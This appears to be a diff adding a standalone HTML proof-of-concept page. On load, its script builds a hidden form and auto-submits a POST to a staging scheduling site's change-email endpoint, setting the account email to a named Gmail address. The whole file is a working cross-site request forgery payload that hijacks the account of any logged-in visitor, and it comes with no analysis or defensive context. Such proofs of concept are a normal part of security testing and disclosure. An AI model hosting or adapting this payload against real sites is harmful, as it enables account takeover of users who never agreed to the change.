@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+
+<script type="text/javascript">
+        window.onload = function() {
+            // Create a form element
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://staging.scheduapp.com/settings/change-email";
+            // Create a hidden input for the email
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = "email";
+            input.value = "tHHsevengraytech@gmail.com"; // Use the correct email format
+            // Append the input to the form
+            form.appendChild(input);
+            // Append the form to the body
+            document.body.appendChild(form);
+            // Submit the form
+            form.submit();
+        };
+    </script>
+
+</html>
